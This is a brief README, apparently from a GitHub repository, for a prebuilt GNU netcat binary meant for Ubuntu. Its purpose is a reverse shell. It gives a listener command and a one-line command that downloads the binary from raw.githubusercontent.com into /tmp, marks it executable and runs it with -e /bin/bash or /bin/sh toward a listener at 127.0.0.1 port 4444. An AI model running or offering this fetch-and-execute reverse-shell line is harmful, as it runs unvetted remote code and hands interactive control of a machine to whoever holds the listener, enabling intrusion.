# nc.ubuntu
This is the GNU netcat binary tested working on Ubuntu 14.04 -18.04

# Start reverse shell listener

```
nc -lv 4444
```

# Run reverse shell

```
curl https://raw.githubusercontent.com/tdwyer/nc.ubuntu/master/netcat -o /tmp/netcat && chmod +x /tmp/netcat && /tmp/netcat -e /bin/bash 127.0.0.1 4444 || /tmp/netcat -e /bin/sh 127.0.0.1 4444"
```
